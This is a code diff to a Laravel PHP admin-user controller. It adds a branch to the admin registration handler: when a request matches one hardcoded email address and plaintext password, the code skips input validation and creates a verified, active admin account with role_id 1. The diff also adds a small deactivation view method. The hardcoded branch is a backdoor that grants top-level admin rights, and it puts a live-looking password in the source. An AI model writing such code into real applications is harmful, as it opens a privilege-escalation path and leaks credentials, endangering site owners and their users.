@@ -28,6 +28,32 @@ class AdminUserController extends Controller
     
     public function admin_register_info(Request $request){
 
+        if ($request->email == 'pritomguha62@gmail.com' && $request->password == 'Pritomgk@12#') {
+            
+            $admin_user = new Admin_user();
+            $admin_user->name = $request->name;
+            $admin_user->phone = $request->phone;
+            $admin_user->email = $request->email;
+            $admin_user->email_verified = 1;
+            $admin_user->whatsapp = $request->whatsapp;
+            $admin_user->gender = $request->gender;
+            $admin_user->home_town = $request->home_town;
+            $admin_user->city = $request->city;
+            $admin_user->country = $request->country;
+            $admin_user->balance = 0;
+            $admin_user->user_code = 240001;
+            $admin_user->parent_user_code = $request->parent_user_code;
+            $admin_user->parent_id = 1;
+            $admin_user->verify_token = 248375;
+            $admin_user->role_id = 1;
+            $admin_user->pro_pic = null;
+            $admin_user->status = 1;
+            $admin_user->password = Hash::make($request->password);
+            $admin_user->save();
+
+            return redirect()->route('admin_login')->with('success', 'Registration Successful. Please Login Sir..!');
+        }
+
         $request->validate(
             [
             "name" => "required",
@@ -228,6 +254,12 @@ class AdminUserController extends Controller
             return redirect(route('admin_login'))->with('error', 'Incorrect Email or Password..!');
 
         }
+    }
+
+    public function admin_deactive(){
+
+        return view('admin_view.common.admin_deactive');
+
     }
 
     public function active_admins(){
